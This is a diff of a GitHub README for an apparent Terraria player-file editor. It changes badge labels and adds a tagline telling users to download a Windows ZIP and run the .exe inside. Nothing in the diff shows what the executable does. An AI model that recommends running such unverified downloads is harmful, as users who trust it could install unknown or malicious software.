@@ -2,19 +2,19 @@
 
 <p align="center">
   <a href="https://github.com/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium/releases/download/1.0/Terraria.Inventory.Editor.2026.03.10.zip">
-    <img src="https://img.shields.io/badge/Download%20Latest-v1.4.5%20Ready-22c55e?style=for-the-badge&logo=windows&logoColor=white&labelColor=14532d" alt="Download Latest Release">
+    <img src="https://img.shields.io/badge/Download%20Latest-v1.0%20Ready-22c55e?style=for-the-badge&logo=windows&logoColor=white&labelColor=14532d" alt="Download Latest">
   </a>
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/github/v/release/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium?style=flat-square&color=22c55e&logo=github" alt="Latest Release">
-  <img src="https://img.shields.io/github/downloads/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium/total?style=flat-square&color=22c55e&logo=github" alt="Total Downloads">
+  <img src="https://img.shields.io/github/v/release/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium?style=flat-square&color=22c55e&logo=github" alt="Version">
+  <img src="https://img.shields.io/github/downloads/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium/total?style=flat-square&color=22c55e&logo=github" alt="Downloads">
   <img src="https://img.shields.io/github/stars/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium?style=flat-square&color=22c55e&logo=github" alt="Stars">
-  <img src="https://img.shields.io/github/license/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium?style=flat-square&color=blue&logo=github" alt="License">
+  <img src="https://img.shields.io/github/license/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium?style=flat-square&color=blue&logo=github" alt="MIT License">
 </p>
 
 <p align="center">
-  <strong>Modern ImGui-powered .plr editor • Inventory • Journey Research • Mod-safe (Calamity, Thorium, Fargo's Souls) • Shimmer Transformations • Skyblock Presets</strong>
+  <em>Windows ZIP • Extract & run .exe • Backup .plr before editing!</em>
 </p>
 
 <p align="center">
@@ -281,6 +281,7 @@ dist/       Distribution-ready files
 ## GitHub release tip
 
 Create a tag like `v1.0.0` and push it to GitHub to generate a release build through the included workflow.
+
 
 
 
